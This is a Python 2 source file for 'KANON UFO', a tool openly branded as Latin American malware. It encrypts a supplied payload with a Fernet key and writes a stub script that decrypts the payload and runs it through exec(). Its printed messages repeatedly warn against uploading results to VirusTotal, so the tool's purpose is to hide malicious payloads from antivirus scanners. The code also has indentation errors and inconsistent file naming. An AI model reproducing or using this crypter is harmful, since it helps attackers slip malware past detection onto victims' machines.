#!/usr/local/bin/python
#KANON UFO

from cryptography.fernet import Fernet
import os
import sys
import random
import time

class bcolors:
  BLUE = '\033[94m'
  GREEN = '\033[92m'
  WARNING = '\033[93m'
  WHITE = '\033[97m'
  ERROR = '\033[91m'
  ENDC = '\033[0m'
  BOLD = '\033[1m'
  UNDERLINE = '\033[4m'
#if sys.argv[0]:
  # print bcolors.BOLD + bcolors.WHITE + "[+] Necesita especificar un archivo de carga útil de entrada para ofuscar"
  # print bcolors.BOLD + bcolors.WHITE + "[+] Syntax : python fernet.py payload.txt "
 #  sys.exit(0)
#else:
with open(sys.argv[1], 'r+') as f:
   contents = f.read()
   banner = '''
                    \.   \.      __,-"-.__      ./   ./
       \.   \`.  \`.-'"" _,="=._ ""`-.'/  .'/   ./
        \`.  \_`-''      _,="=._      ``-'_/  .'/
         \ `-',-._   _.  _,="=._  ,_   _.-,`-' /
      \. /`,-',-._"""  \ _,="=._ /  """_.-,`-,'\ ./
       \`-'  /    `-._  "       "  _.-'    \  `-'/
       /)   (         \    ,-.    /         )   (\
    ,-'"     `-.       \  /   \  /       .-'     "`-,
  ,'_._         `-.____/ /  _  \ \____.-'         _._`,
 /,'   `.                \_/ \_/                .'   `,\
/'       )                  _   KANON UFO      (       `\
        /   _,-'"`-.  ,++|T|||T|++.  .-'"`-,_   \
       / ,-'        \/|`|`|`|'|'|'|\/        `-, \
      /,'             | | | | | | |             `,\
     /'               ` | | | | | '               `\
                        ` | | | '
                          ` | '
    '''
print banner.decode('utf-8')

print bcolors.BOLD + bcolors.WHITE + "                                              [+] MALWARE LATINO"
print bcolors.BOLD + bcolors.WHITE + "                                              [+] KANON UFO "
print bcolors.BOLD + bcolors.WHITE + "                                              [+] YOUTUBE CHANNEL : https://www.youtube.com/c/KanonBlack/videos?view_as=subscriber"
print bcolors.BOLD + bcolors.WHITE + "                                              [+] GRUPO DE TELEGRAM :           "
print bcolors.BOLD + bcolors.WHITE + "                                              [+] GITHUB : https://github.com/kanonufo"
 

 
time.sleep(3)

print bcolors.BLUE + "[+] Raw payload"
print " ============================================================================================="
print contents
print " ============================================================================================="

print bcolors.ERROR + bcolors.BOLD + "[+] GeneraNDO Fernet MultiKey"
key = Fernet.generate_key()
print bcolors.BOLD + bcolors.WHITE + "[+] Key = " + key
print bcolors.WHITE + "[+] cOPIA la clave para el descifrado"

print  bcolors.BOLD + "[+] Generando objeto Fernet ... por favor espere"
f = Fernet(key)
print  bcolors.BOLD + bcolors.WHITE + "[+] Fernet ObjeTO Generado  :"  
print  f
print bcolors.ERROR + bcolors.BOLD + "[+] Encrypting Payload"
time.sleep(2)
print bcolors.BOLD + bcolors.WHITE +  "================================================================================="
enc_payload = f.encrypt(contents)
print bcolors.BOLD + bcolors.WHITE + "[+] Encrypted Payload : " + enc_payload
print bcolors.BOLD + bcolors.WHITE +  "================================================================================="

print bcolors.ERROR + bcolors.BOLD + "[+] Escribiendo carga útil RAW en el archivo, espere"
#filename1 = "payload" 
Filename = "RawPayload%i"%random.randint(1,10000000001)+".txt"
#print Filename # bookmark 

f1 = open("RawPayload%i"%random.randint(1,10000000001)+".txt", "a")
f1.write(enc_payload)
f1.close()

print  bcolors.BOLD + bcolors.WHITE + "[+] Raw Encrypted Payload written to :" + f1.name

print bcolors.BLUE + bcolors.BOLD + "[+] ¿Desea continuar generando la carga útil de un ejecutable? (Y/N)"
decision = str(raw_input("enter Y or N\n"))
if decision == 'N':
   print bcolors.BOLD + bcolors.WHITE + "[+]  Que tengas un buen día !!"
   print bcolors.BOLD + bcolors.WHITE + "[+]  NO SUBIR A VIRUS TOTAL VIRUSTOTAL !!!"
   sys.exit(0)
elif decision == 'Y':
    
    # Cree la carga útil final de Python ejecutable ofuscada
    print bcolors.BOLD + bcolors.WHITE + "[+] Generando la carga útil final de Python ofuscada, espere"
    time.sleep(2)
    final_payload = open("FinalPayload%i"%random.randint(1,10000000001)+".py", "w")
    #final_payload = open("FinalPayload.py", "w")
    final_payload.write("""
from cryptography.fernet import Fernet
import os
import sys
key = """ + "\'"+key+"\'")
    #final_payload = open("FinalPayload%i"%random.randint(1,10000000001)+".py", "a")
final_payload.write("""
f_obj= Fernet(key)
enc_pay =""" "\'"+enc_payload+"\'")
    #final_payload = open("FinalPayload%i"%random.randint(1,10000000001)+".py", "a")
final_payload.write("""
exec(f_obj.decrypt(enc_pay))
    """)
final_payload.close()
print  bcolors.BOLD + bcolors.WHITE + "[+] Final Encrypted Payload Escrito a %s : " + final_payload.name #"FinalPayload%i"%random.randint(1,10000000001)+".py"
print bcolors.BLUE + bcolors.BOLD + "[+] KANON UFO "
decr = 5
while True:
         print bcolors.ERROR + bcolors.BOLD + "[+] NO SUBIR A  VIRUSTOTAL"
         decr = decr-1
         if(decr <=0):
           break
           sys.exit(0)
else: 
     sys.exit(0)
     print bcolors.ERROR + bcolors.BOLD + "[+] Responda Y o N SOLAMENTE" 
     sys.exit(0)
